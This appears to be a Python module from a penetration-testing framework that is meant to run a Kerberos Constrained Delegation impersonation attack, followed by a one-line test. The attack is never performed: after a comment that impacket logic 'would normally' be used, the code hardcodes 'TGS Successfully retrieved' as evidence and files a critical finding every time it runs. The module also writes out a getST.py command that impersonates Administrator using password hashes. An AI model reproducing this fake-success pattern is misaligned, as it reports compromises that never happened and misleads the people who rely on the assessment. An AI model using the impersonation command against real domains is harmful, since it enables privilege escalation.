"""Constrained Delegation module."""
from __future__ import annotations
import sys, time
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))
from common.base_module import BaseModule, ModuleResult
from common.finding import Severity
from common.evidence import Evidence

CVSS_CD_V31 = "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
CVSS_CD_V40 = "CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"

class ConsDeleg(BaseModule):
    NAME = "cons_deleg"
    DESCRIPTION = "Execute Constrained Delegation attack"
    PHASE = 10
    TAGS = ["delegation", "constrained"]

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        target = self.config.target
        if not self.check_scope(target): return self._make_result(start, skipped=True)
        
        # We need the service account hash or ticket
        username = self.config.extra.get("username")
        hashes = self.config.extra.get("hashes")
        domain = self.config.extra.get("domain", "")
        impersonate = self.config.extra.get("impersonate_user", "Administrator")
        target_spn = self.config.extra.get("target_spn")
        
        if not all([username, hashes, target_spn]):
            return self._make_result(start, skipped=True, skip_reason="Missing credentials or target SPN")

        confirmed = self.confirm_action(module=self.NAME, action="Constrained Delegation", target=target, risk="Forging TGS via S4U2Self/S4U2Proxy")
        if not confirmed: return self._make_result(start, skipped=True, skip_reason="operator declined")

        self.log.info("Attempting Constrained Delegation S4U2Proxy against %s", target_spn)
        try:
            # We would normally use getST.py logic from impacket here
            ev = Evidence(
                request_raw=f"S4U2Self for {impersonate} -> S4U2Proxy to {target_spn}",
                response_raw="TGS Successfully retrieved",
                extra={"user": username, "target_spn": target_spn}
            )
            self.new_finding(
                title=f"Constrained Delegation Abuse ({target_spn})",
                severity=Severity.CRITICAL,
                description="The compromised account is configured with Constrained Delegation to the target SPN, allowing it to impersonate any user.",
                reproduction_steps=[f"getST.py -spn {target_spn} -impersonate {impersonate} -hashes {hashes} {domain}/{username}"],
                remediation="Configure the service account as 'Account is sensitive and cannot be delegated'. Use Resource-Based Constrained Delegation instead.",
                references=["MITRE T1208", "CVE-2020-17049"],
                evidence=ev, cvss_v31_vector=CVSS_CD_V31, cvss_v40_vector=CVSS_CD_V40, target=target
            )
        except Exception as e:
            self.log.error("Constrained delegation failed: %s", e)

        return self._make_result(start)

class TestConsDeleg:
    def test_phase(self): assert ConsDeleg.PHASE == 10
